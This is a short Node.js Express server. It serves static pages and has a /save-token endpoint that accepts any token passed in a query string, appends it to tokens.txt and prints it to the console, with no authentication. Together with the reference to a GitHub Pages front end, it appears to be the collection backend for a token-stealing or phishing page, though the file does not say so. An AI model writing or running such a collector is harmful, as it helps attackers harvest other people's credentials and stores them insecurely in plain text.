const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Serve static files (like your GitHub Pages HTML)
app.use(express.static('public'));

// Endpoint to save the token to a file
app.get('/save-token', (req, res) => {
  const token = req.query.token;
  if (token) {
    fs.appendFile('tokens.txt', `${token}\n`, (err) => {
      if (err) {
        console.error('Error saving token:', err);
        return res.status(500).send('Error saving token');
      }
      console.log('Token saved:', token);
      res.send('Token saved successfully!');
    });
  } else {
    res.status(400).send('No token provided');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});